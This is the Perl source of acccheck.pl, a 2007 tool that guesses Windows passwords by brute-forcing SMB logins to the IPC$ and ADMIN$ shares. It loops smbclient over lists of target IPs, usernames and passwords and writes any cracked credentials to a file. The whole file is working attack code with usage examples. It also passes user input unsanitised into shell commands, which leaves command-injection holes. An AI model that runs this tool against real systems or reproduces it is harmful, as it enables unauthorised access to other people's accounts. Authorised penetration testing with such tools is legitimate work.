#!/usr/bin/perl -w

# acccheck.pl v0.2.1 - Windows password guessing tool for Linux
# Copyright (C) 2007  Faisal Dean (Faiz)
# 
# This tool may be used for legal purposes only.  Users take full responsibility
# for any actions performed using this tool.  The author accepts no liability
# for damage caused by this tool.  If these terms are not acceptable to you, then
# do not use this tool.
#
# In all other respects the GPL version 2 applies:
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
# 
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#
# You are encouraged to send comments, improvements or suggestions to
# me at fmd@portcullis-security.com

###############################################################################
#Filename:     acccheck.pl                                                    #
#Written by:   Faisal Dean (Faiz)                                             #
#Version:      0.2.1                                                          #
###############################################################################

###############################################################################
#Software Requirements:                                                       #
#              Perl                                                           #
#              Samba (smbclient)                                              #
###############################################################################

###############################################################################
#Description:                                                                 #
#                                                                             #
# Attempts to connect to the NetBIOS service using smbclient on the target    #
# system. It attempts to connect to the IPC$ and ADMIN$ shares depending on   #
# which flags have been chosen, and tries a combination of usernames and      #
# passwords in the hope to identfy the password to a given account via a      #
# dictionary password guessing attack.                                        #
#                                                                             #
###############################################################################

###############################################################################
#Usage:                                                                       #
#       ./acccheck.pl [optional]                                              #
#                                                                             #
#                  -t <single target ip>                                      #
#                       OR                                                    #
#		   -T <file containing target ips>	                      #
#       optional :                                                            #
#                  -p <single password>                                       #
#                  -P <file containing passwords>                             #
#                  -u <single user>                                           #
#                  -U <file containing usernames>                             #
#                  -v <verbose mode>                                          #
#Examples:                                                                    #
#       acccheck.pl -t 10.10.10.1                                             #
#                  This will attempt a BLANK password against the             #
#                  Administrator account.                                     #
#       acccheck.pl -t 10.10.10.1 -p password.txt                             #
#                  This will attempt all password in 'password.txt' against   #
#                  the 'administrator' account.                               #
#       acccehck.pl -t 10.10.10.1 -u users.txt -p password.txt                #
#                  This will attempt all of the passwords in 'password.txt'   #
#                  against the users in 'users.txt'.                          #
###############################################################################

use Getopt::Std;
use IO::Socket;
use Tie::File;
use Term::ANSIColor;

use vars qw($INPUTFILE $PASSFILE $USERFILE @IP_LIST @PASS_LIST @USER_LIST);
use vars qw($inputFile $passFile $userFile $singleIp $singlePass $singleUser $connectValue $verbose);

$inputFile=0;
$passFile=0;
$userFile=0;
$verbose=0;

#main
{
	$SIG{"INT"} = "cleanup";

	#get options from command line
	getopts("t:T:p:P:u:U:v");

	if($opt_t)
	{
		system("echo $opt_t > t.txt");
		$INPUTFILE = "t.txt";
		$inputFile = 1;
	}
	if($opt_T)
	{

		$INPUTFILE = $opt_T;
		$inputFile = 1;
	}
	if($opt_p)
	{
		system("echo $opt_p > p.txt");
		$PASSFILE = "p.txt";
		$passFile = 1;
	}
	if($opt_P)
	{
		$PASSFILE = $opt_P;
		$passFile = 1;
	}
	if($opt_u)
	{
		system("echo $opt_u > u.txt");
		$USERFILE = "u.txt";
		$userFile = 1;
	}
	if($opt_U)
	{
		$USERFILE = $opt_U;
		$userFile = 1;
	}
	if($opt_v)
	{
		$verbose = 1;
		$opt_v = 1;
	}
	
	#read in the content of the various files into a list
	if($inputFile == 1)
	{
		tie @IP_LIST, 'Tie::File', $INPUTFILE or die "cannot open $INPUTFILE file";
	}
	if($passFile == 1)
	{
		tie @PASS_LIST, 'Tie::File', $PASSFILE or die "cannot open $PASSFILE file";
	}
	if($userFile == 1)
	{
		tie @USER_LIST, 'Tie::File', $USERFILE or die "cannot open $USERFILE file";
	}


	#do some flag checking before you start
	if($inputFile == 0)
	{
		usage();				#quit with some usage information
	} 
	else
	{
		smbConnect();				#do the business
		cleanup();
	}

	exit();
	
}
		
#show usage information and quit
sub usage {
	print color("green"), "\nacccheck.pl v0.2.1 - By Faiz\n\n";
	print "Description:\n";
	print "Attempts to connect to the IPC\$ and ADMIN\$ shares depending on which flags have been\n";
	print "chosen, and tries a combination of usernames and passwords in the hope to identify\n";
	print "the password to a given account via a dictionary password guessing attack.\n", color("reset");
        print "\nUsage = ./acccheck.pl [optional]\n\n";
	print " -t [single host IP address]\n";
	print " OR \n";
        print " -T [file containing target ip address(es)]\n";

        print "\nOptional:\n";
	print " -p [single password]\n";
	print " -P [file containing passwords]\n";
	print " -u [single user]\n";
	print " -U [file containing usernames]\n";
	print " -v [verbose mode]\n\n";
	print color("green"), "Examples\n";
	print "Attempt the 'Administrator' account with a [BLANK] password.\n";
	print "	acccheck.pl -t 10.10.10.1\n";
	print "Attempt all passwords in 'password.txt' against the 'Administrator' account.\n";
	print "	acccheck.pl -t 10.10.10.1 -P password.txt\n";
	print "Attempt all password in 'password.txt' against all users in 'users.txt'.\n";
	print "	acccehck.pl -t 10.10.10.1 -U users.txt -P password.txt\n";
	print "Attempt a single password against a single user.\n";
	print "	acccheck.pl -t 10.10.10.1 -u administrator -p password\n", color("reset");
        exit();
}

sub output {
	if($verbose == 1)
	{
		print"$_[0]\n";
	}
}

sub cleanup {
	system("rm -rf t.txt p.txt u.txt");
	exit();	
}


#this is the main routine, a bit repetitive, but hey, what the hell......it works :)
sub smbConnect {   
	foreach $singleIp (@IP_LIST)
	{
       		chomp($singleIp);
		if(($userFile == 1) and ($passFile == 1))
		{
			foreach $singleUser (@USER_LIST)
			{
				chomp($singleUser);
				foreach $singlePass (@PASS_LIST)
				{
					chomp($singlePass);
					if($singlePass)
					{		
						output("Host:$singleIp, Username:'$singleUser', Password:'$singlePass'");
						$connectValue = system("smbclient \\\\\\\\$singleIp\\\\IPC\$ -U '$singleUser'%'$singlePass' -c 'exit' 1> /dev/null 2> /dev/null");
						if($connectValue == 0)
                       				{
                               				print"\n        SUCCESS.... connected to $singleIp with username:'$singleUser' and password:'$singlePass'\n";
							system("echo Success: Target $singleIp, Username:'$singleUser' Password:'$singlePass' >> cracked");
							last;
						}
					}
					elsif(!$singlePass)
					{
						output("Host:$singleIp, Username:'$singleUser', Password:'$singlePass'");
                                                $connectValue = system("smbclient \\\\\\\\$singleIp\\\\admin\$ -U '$singleUser'%'$singlePass' -c 'exit' 1> /dev/null 2> /dev/null");
                                                if($connectValue == 0)
                                                {
                                                        print"\n        SUCCESS.... connected to $singleIp with username:'$singleUser' and password:'$singlePass'\n";
                                                        system("echo Success: Target $singleIp, Username:'$singleUser' Password:'$singlePass' >> cracked");
                                                        last;
                                                }

					}
				}
			}
			print"\nEnd of Scan\n\n";
              		}
		elsif(($userFile == 0) and ($passFile == 1))
		{
			foreach $singlePass (@PASS_LIST)
			{
				chomp($singlePass);
				output("Host:$singleIp, Username:Administrator, Password:'$singlePass'");
				$connectValue = system("smbclient \\\\\\\\$singleIp\\\\admin\$ -U Administrator%'$singlePass' -c 'exit' 1> /dev/null 2> /dev/null");
				if($connectValue == 0)
				{
					print"\n	SUCCESS.... connected to $singleIp with username:'Administrator' and password:'$singlePass'\n";
					system("echo Success: Target $singleIp, Username:'Administrator' Password:'$singlePass' >> cracked");
				}
			}
			print"\nEnd of Scan\n\n";
		}
		elsif(($userFile == 1) and ($passFile == 0))
		{
			foreach $singleUser (@USER_LIST)
			{
				chomp($singleUser);
				output("Host:$singleIp, Username:'$singleUser', Password:BLANK");
                       		$connectValue = system("smbclient \\\\\\\\$singleIp\\\\admin\$ -U '$singleUser'% -c 'exit' 1> /dev/null 2> /dev/null");
                       		if($connectValue == 0)
                       		{
                               		print"\n        SUCCESS.... connected to $singleIp with username:'$singleUser' and password:' '\n";
					system("echo Success: Target $singleIp, Username:'$singleUser' Password:' ' >> cracked");
				}
			}
			print"\nEnd of Scan\n\n";
		}
		elsif(($userFile == 0) and ($passFile == 0))
		{
			output("Host:$singleIp, Username:Administrator, Password:BLANK");
			$connectValue = system("smbclient \\\\\\\\$singleIp\\\\admin\$ -U Administrator% -c 'exit' 1> /dev/null 2> /dev/null");
			if($connectValue == 0)
			{
				print"\n	SUCCESS.... connected to $singleIp with username:'Administrator' and password:' '\n";
				system("echo Success: Target $singleIp, Username:'Administrator' Password:' ' >> cracked");
			}
			print"\nEnd of Scan\n\n";
		}
	}
}